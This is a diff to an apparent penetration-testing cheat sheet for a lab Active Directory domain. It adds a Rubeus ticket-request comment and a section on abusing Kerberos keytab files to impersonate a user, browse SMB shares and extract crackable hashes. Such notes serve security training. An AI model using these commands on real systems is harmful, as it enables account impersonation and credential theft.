@@ -283,6 +283,7 @@ sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09c
 **Rubeus**
 
 ```powershell
+# forge ticket rubeus
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 ```
 
@@ -374,4 +375,33 @@ ls -la /tmp
 ```
 
 ## Abusing KeyTab Files
+
+**Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.
+
+```bash
+# Listing KeyTab file information
+klist -k -t /opt/specialfiles/carlos.keytab
+```
+
+### Impersonating a user with a KeyTab
+
+```bash
+klist
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+
+# connect smb as carlos
+smbclient //dc01/carlos -k -c ls
+```
+
+### KeyTab Extract
+
+Use **KeyTabExtract** to extract the realm, service principal, encryption type, and crackable hashes from `.keytab` files, which may enable password recovery and Linux account access.
+
+- https://github.com/sosdave/KeyTabExtract
+
+```bash
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+```
+
+## Abusing KeyTab ccache
 
